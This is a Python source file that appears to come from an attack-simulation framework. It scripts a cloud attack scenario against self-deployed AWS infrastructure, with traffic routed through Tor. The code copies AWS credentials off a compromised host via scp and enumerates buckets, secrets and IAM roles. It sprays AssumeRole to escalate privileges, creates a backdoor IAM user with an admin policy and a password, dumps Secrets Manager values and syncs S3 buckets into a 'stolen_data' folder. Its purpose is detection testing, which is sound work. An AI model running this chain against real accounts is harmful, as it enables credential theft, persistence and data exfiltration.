import os
import string
import random
import shlex
import re
import time
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored

from core.helpers import (
    loading_animation,
    generate_ssh_key,
    upload_file_to_server,
    run_command,
    run_command_capture,
)

from .consts import *

CONNECTIVITY_CHECK_INTERVAL = 60  # In seconds
MAX_CONNECTIVITY_WAIT_TIME = 60 * 10


class ScenarioExecution:
    def __init__(self):
        self.agent_included = None
        self.compromised_ec2_external_ip = None
        self.attacker_ec2_external_ip = None
        self.lambda_role_arn = None
        self.exfil_bucket_names = []
        self.compromised_ec2_key = "./compromised_id_rsa"
        self.compromised_ec2_public_key = "./compromised_id_rsa.pub"
        self.attacker_ec2_key = "./attacker_id_rsa"
        self.backdoor_username = DEFAULT_BACKDOOR_USERNAME
        self.attacker_env_vars = {}

        self.discovered_roles = []
        self.discovered_buckets = []
        self.discovered_secrets = []
        self.extra_discovered_secrets = []

        self.accessible_roles = []

    def read_pulumi_config(self):
        with open(PULUMI_OUTPUT_JSON_PATH, "r") as file:
            data = json.load(file)

        self.agent_included = data["Agent Included"]
        self.attacker_ec2_external_ip = data["Attacker Server Public IP"]
        self.lambda_role_arn = data["Lambda Role ARN"]
        self.iam_monitor_role_arn = data["IAM Monitor Role ARN"]
        self.exfil_bucket_names = data["Exfil Bucket Names"]

        if self.agent_included:
            self.compromised_ec2_external_ip = data["Compromised Server Public IP"]
        else:
            self.attacker_env_vars["AWS_ACCESS_KEY_ID"] = data["Dev Access Key ID"]
            self.attacker_env_vars["AWS_SECRET_ACCESS_KEY"] = data[
                "Dev Access Key Secret"
            ]
            self.attacker_env_vars["AWS_REGION"] = data["Region"]

        self.extra_region = data["ExtraRegion"]  # For multi-region secrets

    def init_infra(self):
        if not os.path.exists(self.compromised_ec2_key):
            generate_ssh_key(self.compromised_ec2_key)
        if not os.path.exists(self.attacker_ec2_key):
            generate_ssh_key(self.attacker_ec2_key)

        run_command(
            f"cd ./scenarios/scenario_8/infra/ && pulumi up -s {PULUMI_STACK_NAME} -y"
        )
        run_command(
            f"cd ./scenarios/scenario_8/infra/ && pulumi stack -s {PULUMI_STACK_NAME} output --json --show-secrets > ../../../{PULUMI_OUTPUT_JSON_PATH}"
        )

    def check_agent_connected(self):
        cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} "sudo {CYTOOL_STATUS_CMD}"'
        output = run_command_capture(cmdline, check=False)
        edr_state = re.search(r"\nEDR\s+\w+\s+(\w+)\s+", output)
        if edr_state:
            edr_state = edr_state.group(1)

        return edr_state == "Enabled"

    def get_compromised_server_sshd_public_key(self):
        # This is not the key we generated to access the compromised machine, but the key used to verify its identity
        # Although in this scenario host verification is not done in general, we still want to do it when connecting through Tor
        cmdline = f"ssh -o StrictHostKeyChecking=no -i {self.compromised_ec2_key} ubuntu@{self.compromised_ec2_external_ip} cat /etc/ssh/ssh_host_rsa_key.pub"
        output = run_command_capture(cmdline)

        return output

    def _wait_for_condition(self, check_func, success_msg, timeout_msg):
        """
        Generic wait loop with timeout for any condition check.

        Args:
            check_func: Callable that returns True when condition is met
            success_msg: Message to display on success
            timeout_msg: Message to display on timeout
        """
        condition_met = check_func()
        time_waited = 0

        while not condition_met:
            if time_waited > MAX_CONNECTIVITY_WAIT_TIME:
                print(colored(timeout_msg, "red"))
                exit(1)

            time.sleep(CONNECTIVITY_CHECK_INTERVAL)
            time_waited += CONNECTIVITY_CHECK_INTERVAL
            condition_met = check_func()

        print(colored(success_msg, "green"))

    def wait_for_agent(self):
        self._wait_for_condition(
            check_func=self.check_agent_connected,
            success_msg="Agent connected!",
            timeout_msg="Agent did not connect for too long (timed out), aborting...",
        )

    def attacker_run(self, cmdline, return_errcode=False, check=False, use_tor=True):
        """
        Execute a command on the attacker EC2 instance via SSH.

        Args:
            cmdline: Command to execute on remote machine
            return_errcode: If True, return exit code; if False, return stdout
            check: If True, raise exception on non-zero exit code
            use_tor: If True, route command through proxychains/Tor

        Returns:
            Command output (str) if return_errcode=False, else exit code (int)
        """
        # Build the export string from the class state
        env_prefix = ""
        if self.attacker_env_vars:
            # Creates: "export KEY='VAL'; export KEY2='VAL2'; "
            env_prefix = (
                " ".join(
                    [f"export {k}='{v}';" for k, v in self.attacker_env_vars.items()]
                )
                + " "
            )

        # Prepend it to the user's command
        if use_tor:
            full_remote_cmd = f"{env_prefix} proxychains4 -q {cmdline}"
        else:
            full_remote_cmd = f"{env_prefix}{cmdline}"

        escaped_cmd = shlex.quote(full_remote_cmd)

        # Construct the SSH wrapper
        nested_cmdline = f"ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} {escaped_cmd} 2>&1"

        if return_errcode:
            # Return exit code as integer
            return run_command(nested_cmdline, check=check)
        else:
            # Return output as string with retry logic
            result = run_command_capture(nested_cmdline, check=check)

            # Sometimes connection is unstable and needs retries
            while (
                result.find("Connection reset by peer") != -1
                or result.find("Network is down") != -1
            ):
                print(colored("Connection lost, retrying...", "yellow"))
                sleep(CONNECTIVITY_CHECK_INTERVAL)
                result = run_command_capture(nested_cmdline, check=check)

            return result

    def wait_for_attacker(self):
        tor_status_cmdline = "cat /home/ubuntu/tor_status.txt | grep successful"

        def check_tor():
            return (
                self.attacker_run(
                    tor_status_cmdline, return_errcode=True, use_tor=False
                )
                == 0
            )

        self._wait_for_condition(
            check_func=check_tor,
            success_msg="Attacker machine initialized!",
            timeout_msg="Attacker machine did not initialize for too long (timed out), aborting...",
        )

    def _run_aws_list_command(self, command, resource_type):
        """
        Execute AWS list command and parse results.

        Args:
            command: AWS CLI command to execute
            resource_type: Human-readable resource name (e.g., "buckets", "secrets")

        Returns:
            List of discovered resources, or empty list if access denied
        """
        result = self.attacker_run(command)

        # Check for configuration errors
        if result.find(" by running ") != -1:
            raise Exception(
                "AWS Configuration error on attacker's machine, likely missing credentials"
            )

        # Check for access denied
        if result.find("AccessDenied") != -1:
            print(
                colored(
                    f"{resource_type.capitalize()} enumeration attempt failed", "yellow"
                )
            )
            return []

        # Parse results
        discovered = [item.strip('"') for item in result.split()]
        print(
            colored(f"[ATTACKER] Discovered {len(discovered)} {resource_type}", "red")
        )
        return discovered

    def attempt_recon(self):
        # List buckets
        self.discovered_buckets = self._run_aws_list_command(
            'aws s3api list-buckets | jq ".Buckets[].Name"', "buckets"
        )

        # List secrets (primary region)
        self.discovered_secrets = self._run_aws_list_command(
            'aws secretsmanager list-secrets | jq ".SecretList[].Name"', "secrets"
        )

        # List secrets (extra region)
        self.extra_discovered_secrets = self._run_aws_list_command(
            f'aws secretsmanager list-secrets --region {self.extra_region} | jq ".SecretList[].Name"',
            f"secrets in {self.extra_region}",
        )

        # List IAM roles
        self.discovered_roles = self._run_aws_list_command(
            'aws iam list-roles | jq ".Roles[].Arn"', "IAM roles"
        )

    def secrets_dump(self):
        for secret_name in self.discovered_secrets:
            cmdline = f'aws secretsmanager get-secret-value --secret-id "{secret_name}"'

            res = self.attacker_run(cmdline)
            if not res:
                raise Exception("Error, secrets dump returned empty result")
            print(res)

        # Dump from extra region as well
        for secret_name in self.extra_discovered_secrets:
            cmdline = f'aws secretsmanager get-secret-value --region {self.extra_region} --secret-id "{secret_name}"'

            res = self.attacker_run(cmdline)
            if not res:
                raise Exception("Error, secrets dump returned empty result")
            print(res)

    def attacker_assume_role(
        self, role_arn, session_name="DebuggingSession", update_env=True, check=True
    ):
        cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --output json 2>&1"

        output = self.attacker_run(cmd)

        if output.find("AccessDenied") != -1:
            # Ensure success if flag requires it
            if check:
                print(
                    colored(
                        "[ATTACKER] Failed to assume role (access denied)", "yellow"
                    )
                )
                raise Exception(
                    "Mandatory AssumeRole failed due to lack of permissions"
                )

            return False

        else:
            try:
                credentials = json.loads(output)["Credentials"]

                # Update the class state
                if update_env:
                    self.attacker_env_vars["AWS_ACCESS_KEY_ID"] = credentials[
                        "AccessKeyId"
                    ]
                    self.attacker_env_vars["AWS_SECRET_ACCESS_KEY"] = credentials[
                        "SecretAccessKey"
                    ]
                    self.attacker_env_vars["AWS_SESSION_TOKEN"] = credentials[
                        "SessionToken"
                    ]
                    print(
                        colored(
                            "[ATTACKER] Credentials updated with assumed role", "red"
                        )
                    )

                print(colored("[ATTACKER] Successfully assumed role!", "red"))
                return True

            except (json.JSONDecodeError, KeyError) as e:
                print(
                    colored(
                        "[ATTACKER] Failed to assume role - unexpected output", "red"
                    )
                )
                print(output)
                raise e

    def attempt_backdoor(self):
        # Create new user
        result = self.attacker_run(
            f"aws iam create-user --user-name {self.backdoor_username} --tags Key=UC-OWNER,Value=Attacker"
        )
        if result.find("AccessDenied") != -1:
            print(
                colored(
                    "[ATTACKER] Failed to create backdoor user (access denied)",
                    "yellow",
                )
            )
            return False

        # Attach admin policy
        result = self.attacker_run(
            f"aws iam attach-user-policy --user-name {self.backdoor_username} --policy-arn {BACKDOOR_ADMIN_POLICY_ARN}"
        )
        if result.find("AccessDenied") != -1:
            print(
                colored(
                    "[ATTACKER] Failed to attach admin policy (access denied)", "yellow"
                )
            )
            return False

        # Create password for user
        password_charset = string.ascii_letters + string.digits
        generated_password = "".join(random.choices(password_charset, k=12)) + "1!"
        print(
            colored(
                f"[ATTACKER] Generated password for backdoor user {self.backdoor_username}: {generated_password}",
                "red",
            )
        )

        result = self.attacker_run(
            f"aws iam create-login-profile --user-name {self.backdoor_username} --password {generated_password}"
        )
        print(result)

        if result.find("AccessDenied") != -1:
            print(
                colored(
                    "[ATTACKER] Failed to create login profile (access denied)",
                    "yellow",
                )
            )
            return False

        print(colored("[ATTACKER] Backdoor user created successfully!", "red"))
        return True

    def s3_exfiltration(self):
        print(
            colored(
                f"[ATTACKER] Exfiltrating {len(self.exfil_bucket_names)} S3 buckets",
                "red",
            )
        )
        self.attacker_run(
            "rm -rf /home/ubuntu/stolen_data/"
        )  # Clear up the directory to make sure we don't have it already

        for bucket_name in self.exfil_bucket_names:
            print(
                colored(
                    f"[ATTACKER] Exfiltrating S3 bucket: {bucket_name}", "red"
                )
            )
            res = self.attacker_run(
                f"aws s3 sync s3://{bucket_name} /home/ubuntu/stolen_data/{bucket_name}/"
            )
            if not res:
                raise Exception(
                    f"Error, S3 exfiltration failed for bucket: {bucket_name}"
                )

            print(res)

    def scenario_8_execute(self, manual):
        # Init
        print("-" * 30)
        print(
            colored(
                "Executing Scenario 8: AWS Privilege Escalation, Persistence & Data Exfiltration",
                "cyan",
            )
        )
        print("-" * 30)

        print(
            colored(
                "Please make sure that this scenario's Pulumi.yaml is properly configured for your specific environment.",
                "yellow",
            )
        )

        input("Press enter to continue...")

        print(colored("Rolling out infrastructure...", "yellow"))
        print("-" * 30)

        self.init_infra()
        print(colored("Infrastructure deployed successfully!", "green"))

        if manual:
            print(
                colored(
                    "Using manual mode - use 'post-launch' to start the attack simulation",
                    "yellow",
                )
            )

        else:
            self.post_execution()

    def post_execution(self):
        print(colored("Starting attack simulation...", "cyan"))
        self.read_pulumi_config()

        print(colored("Waiting for attacker machine to initialize...", "yellow"))
        loading_animation()

        self.wait_for_attacker()

        if self.agent_included:
            print(
                colored(
                    "Waiting for compromised machine with agent to initialize...",
                    "yellow",
                )
            )
            loading_animation()
            self.wait_for_agent()

            # Upload compromised SSH key to attacker's machine - Scenario with agent begins with the attackers having their hands on this SSH key
            print(colored("[ATTACKER] Uploading compromised machine SSH key", "red"))
            upload_file_to_server(
                self.compromised_ec2_key,
                "ubuntu",
                self.attacker_ec2_external_ip,
                "/home/ubuntu/",
                key_path="./attacker_id_rsa",
            )

            # Add compromised server identity to known hosts of attacker's machine for verification
            print(
                colored("[ATTACKER] Adding compromised machine to known hosts", "red")
            )

            compromised_sshd_public_key = self.get_compromised_server_sshd_public_key()
            self.attacker_run(
                f"echo {self.compromised_ec2_external_ip} {compromised_sshd_public_key} >> ~/.ssh/known_hosts",
                check=True,
                use_tor=False,
            )

            # Local AWS CLI credentials are exfilterated onto attacker's machine
            print(
                colored(
                    "[ATTACKER] Exfiltrating AWS credentials from compromised machine",
                    "red",
                )
            )
            self.attacker_run("mkdir ~/.aws")

            self.attacker_run(
                f"scp -i {os.path.basename(self.compromised_ec2_key)} ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials",
                check=True,
            )
            self.attacker_run(
                f"scp -i {os.path.basename(self.compromised_ec2_key)} ubuntu@{self.compromised_ec2_external_ip}:~/.aws/config ./.aws/config",
                check=True,
            )

        else:
            print(
                colored("Agent not included in the scenario, proceeding...", "yellow")
            )
            # Without agent the scenario begins with the attackers using the compromised dev user AWS CLI credentials

        # Recon attempts will fail since initial compromised user has low privileges
        print(
            colored(
                "[ATTACKER] Attempting reconnaissance and backdoor creation (limited permissions expected)",
                "red",
            )
        )
        self.attempt_recon()
        self.attempt_backdoor()

        # Assume lambda role
        print(colored("[ATTACKER] Attempting to assume Lambda role...", "red"))
        self.attacker_assume_role(self.lambda_role_arn)

        # Will fail since privileges are still not sufficient
        print(
            colored(
                "[ATTACKER] Attempting backdoor creation again (still insufficient permissions)",
                "red",
            )
        )
        self.attempt_backdoor()

        # AssumeRole spray
        if self.discovered_roles:
            print(
                colored(
                    f"[ATTACKER] Spraying AssumeRole on {len(self.discovered_roles)} discovered roles...",
                    "red",
                )
            )

            for role_arn in tqdm(self.discovered_roles):
                if self.attacker_assume_role(role_arn, update_env=False, check=False):
                    self.accessible_roles.append(role_arn)

        if self.iam_monitor_role_arn not in self.accessible_roles:
            print(
                colored(
                    "Could not assume IAM Monitor role (required for scenario), aborting...",
                    "red",
                )
            )
            exit(1)

        # Use higher privileges discovered role
        print(colored("[ATTACKER] Attempting to assume IAM Monitor role...", "red"))
        self.attacker_assume_role(self.iam_monitor_role_arn)
        if not self.attempt_backdoor():
            print(
                colored(
                    "Could not create backdoor user with privileged role, aborting...",
                    "red",
                )
            )
            exit(1)

        self.attempt_recon()

        # Secrets dump
        print(colored("[ATTACKER] Dumping secrets from Secrets Manager...", "red"))
        if not self.discovered_secrets:
            print(
                colored(
                    "No secrets discovered during reconnaissance, aborting...", "red"
                )
            )
            exit(1)

        self.secrets_dump()

        # Exfiltration from S3
        missing_buckets = [
            b for b in self.exfil_bucket_names if b not in self.discovered_buckets
        ]
        if missing_buckets:
            print(
                colored(
                    f"{len(missing_buckets)} target S3 bucket(s) not found in discovered buckets, aborting...",
                    "red",
                )
            )
            exit(1)

        print(colored("[ATTACKER] Exfiltrating S3 data...", "red"))
        self.s3_exfiltration()

    def scenario_8_destroy(self):
        print(colored("Cleaning up: Removing backdoor user...", "yellow"))
        run_command(
            f"aws iam delete-login-profile --user-name {self.backdoor_username}",
            check=False,
        )
        run_command(
            f"aws iam detach-user-policy --user-name {self.backdoor_username} --policy-arn {BACKDOOR_ADMIN_POLICY_ARN}",
            check=False,
        )
        run_command(
            f"aws iam delete-user --user-name {self.backdoor_username}", check=False
        )

        print(colored("Destroying infrastructure...", "yellow"))
        run_command(
            f"cd ./scenarios/scenario_8/infra && pulumi destroy -s {PULUMI_STACK_NAME} --yes"
        )
